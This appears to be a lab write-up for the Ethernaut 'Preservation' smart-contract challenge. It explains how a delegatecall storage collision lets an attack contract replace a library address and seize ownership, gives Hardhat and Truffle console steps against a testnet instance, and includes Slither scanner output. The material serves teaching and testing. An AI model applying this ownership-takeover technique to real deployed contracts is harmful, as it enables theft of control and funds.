# Preservation

[Preservation](https://ethernaut.openzeppelin.com/level/0x2754fA769d47ACdF1f6cDAa4B0A8Ca4eEba651eC)

1. `Preservation` delegates calls to `LibraryContract`. 
1. Storage for `Preservation` and `LibraryContract` overlaps.
1. Calling `LibraryContract::setTime()` overwrites an address held in `Preservation`.
1. Overwriting allow us to replace an instance of `LibraryContract` by a malicious contract.
1. The malicious contract is then able to overwrite the owner of `Preservation`.

<BR />


Contract: <BR />
``0xFF3eC9eb96183C2B656588ddD8D80f243c6cA220``

<BR />

## Test Attack

```BASH
npx hardhat compile
npx hardhat console
```

```JS
accounts = await ethers.getSigners()
accounts[0].address

LibCtrFactory = await ethers.getContractFactory("LibraryContract")
libctr = await LibCtrFactory.deploy()
libctr.address

PreFactory = await ethers.getContractFactory("Preservation")
pre = await PreFactory.deploy(libctr.address, libctr.address)

AttackFactory = await ethers.getContractFactory("Attack")
attack = await AttackFactory.deploy()

// Get initial Owner and library address
await pre.owner()
await pre.timeZone1Library()    
libctr.address

// Change library to attack contract and confirm change
await pre.setFirstTime(attack.address)
await pre.timeZone1Library()
attack.address
libctr.address

// Change owner to whatever we want...
await pre.owner()
await pre.setFirstTime(attack.address)
await pre.owner()
await pre.timeZone1Library()
attack.address
```

<BR />


## Live Attack

Instance Address: <BR />
``0xFF3eC9eb96183C2B656588ddD8D80f243c6cA220``


Attack Contract Address: <BR />
``0xA45bcbb0CeB2f15434fb1F4675151FDa8786D9Ca``


```BASH
npx hardhat compile
npx hardhat console --network goerli
```

```JS
accounts = await ethers.getSigners()
accounts[0].address

PreFactory = await ethers.getContractFactory("Preservation")
pre = await PreFactory.attach('0xFF3eC9eb96183C2B656588ddD8D80f243c6cA220')

AttackFactory = await ethers.getContractFactory("Attack")
attack = await AttackFactory.deploy()

// Get initial Owner and library address
await pre.owner()
await pre.timeZone1Library()    

// Change library to attack contract and confirm change
await pre.setFirstTime(attack.address)
await pre.timeZone1Library()
attack.address

// Change owner to whatever we want...
// Failing with out-of-gas!
await pre.owner()
await pre.setFirstTime(accounts[0].address) // FAILED!
await pre.timeZone1Library()
await pre.owner()

accounts[0].address
```

<BR />

## Live Attack Try 2

Since the attack was failing out of gas, and because of the problems in Hardhat we simply switch to truffle (``13_Preservation_Truffle``) and complete the attack as follows:

```BASH
truffle console --network goerli
```

```JS
sender = accounts[5]

pre    = await Preservation.at("0xFF3eC9eb96183C2B656588ddD8D80f243c6cA220")
attack = await Attack.at("0xA45bcbb0CeB2f15434fb1F4675151FDa8786D9Ca")

await pre.owner()
await pre.timeZone1Library()    
attack.address

await pre.setFirstTime(sender, {from: sender})
await pre.owner()
```

<BR />


## Others

When setting up Hardhat we ended up with a problem becuase of the Ethers version.
The problem was avoided by:

1. Delete node_modules
1. Copy over ``package.json`` and ``package-lock.json`` from ``11_GatekeeperTwo``
1. ``npm install``

Configuration that works:

```JS
// > ethers.version
// 'ethers/5.7.2'

LibCtrFactory = await ethers.getContractFactory("LibraryContract")
libctr = await LibCtrFactory.connect(accounts[0]).deploy()
libctr.address
```

Problematic configuration:

```JS
// > ethers.version
// '6.5.1'

LibCtrFactory = await ethers.getContractFactory("LibraryContract")
libctr = await LibCtrFactory.connect(accounts[0]).deploy()
libctr.target
```

<BR />

## Vulnerability Testing Tools


<BR />

### Slither

```BASH
solc-select use 0.8.0
slither ./contracts/Preservation.sol  --hardhat-ignore-compile  --exclude-optimization
```

```
Preservation.setFirstTime(uint256) (contracts/Preservation.sol#22-24) uses delegatecall to a input-controlled function id
        - timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature,_timeStamp)) (contracts/Preservation.sol#23)
Preservation.setSecondTime(uint256) (contracts/Preservation.sol#27-29) uses delegatecall to a input-controlled function id
        - timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature,_timeStamp)) (contracts/Preservation.sol#28)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#controlled-delegatecall

Preservation.setFirstTime(uint256) (contracts/Preservation.sol#22-24) ignores return value by timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature,_timeStamp)) (contracts/Preservation.sol#23)
Preservation.setSecondTime(uint256) (contracts/Preservation.sol#27-29) ignores return value by timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature,_timeStamp)) (contracts/Preservation.sol#28)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#unchecked-low-level-calls

Preservation.constructor(address,address)._timeZone1LibraryAddress (contracts/Preservation.sol#15) lacks a zero-check on :
                - timeZone1Library = _timeZone1LibraryAddress (contracts/Preservation.sol#16)
Preservation.constructor(address,address)._timeZone2LibraryAddress (contracts/Preservation.sol#15) lacks a zero-check on :
                - timeZone2Library = _timeZone2LibraryAddress (contracts/Preservation.sol#17)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#missing-zero-address-validation

Pragma version^0.8.0 (contracts/Preservation.sol#2) allows old versions
solc-0.8.0 is not recommended for deployment
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#incorrect-versions-of-solidity

Low level call in Preservation.setFirstTime(uint256) (contracts/Preservation.sol#22-24):
        - timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature,_timeStamp)) (contracts/Preservation.sol#23)
Low level call in Preservation.setSecondTime(uint256) (contracts/Preservation.sol#27-29):
        - timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature,_timeStamp)) (contracts/Preservation.sol#28)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#low-level-calls

Parameter Preservation.setFirstTime(uint256)._timeStamp (contracts/Preservation.sol#22) is not in mixedCase
Parameter Preservation.setSecondTime(uint256)._timeStamp (contracts/Preservation.sol#27) is not in mixedCase
Constant Preservation.setTimeSignature (contracts/Preservation.sol#13) is not in UPPER_CASE_WITH_UNDERSCORES
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#conformance-to-solidity-naming-conventions

Variable Preservation.constructor(address,address)._timeZone1LibraryAddress (contracts/Preservation.sol#15) is too similar to Preservation.constructor(address,address)._timeZone2LibraryAddress (contracts/Preservation.sol#15)
Variable Preservation.timeZone1Library (contracts/Preservation.sol#7) is too similar to Preservation.timeZone2Library (contracts/Preservation.sol#8)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#variable-names-are-too-similar

Preservation.storedTime (contracts/Preservation.sol#10) is never used in Preservation (contracts/Preservation.sol#4-30)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#unused-state-variable
./contracts/Preservation.sol analyzed (1 contracts with 76 detectors), 16 result(s) found
```
